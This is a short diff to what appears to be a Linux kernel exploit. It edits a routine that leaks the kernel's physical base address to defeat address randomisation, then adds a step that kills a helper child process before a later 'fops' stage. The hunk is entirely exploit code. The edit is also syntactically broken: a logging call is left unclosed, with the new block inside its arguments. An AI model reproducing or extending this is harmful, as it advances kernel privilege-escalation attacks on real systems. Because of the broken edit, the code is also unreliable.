@@ -1207,7 +1207,14 @@ static int slide_leak_physical_base(void) {
     slide_p0_session_fresh = 1;
     size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
     pr_success("p0 physical elapsed_ms=%zu fresh=%d/%d\n",
-               elapsed_ms, fresh_attempt, fresh_page_attempts);
+               elapsed_ms, fresh_attempt, fresh_page_attempts
+            /* Kill P0 reference keeper before returning to fops stage */
+    if (pipe_prepare_child > 0) {
+      pr_info("killing p0 reference keeper pid=%d\n", pipe_prepare_child);
+      kill(pipe_prepare_child, SIGKILL);
+      waitpid(pipe_prepare_child, NULL, 0);
+      pipe_prepare_child = -1;
+    }
     return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
   }
     // Fallback: virtual verification via configfs read
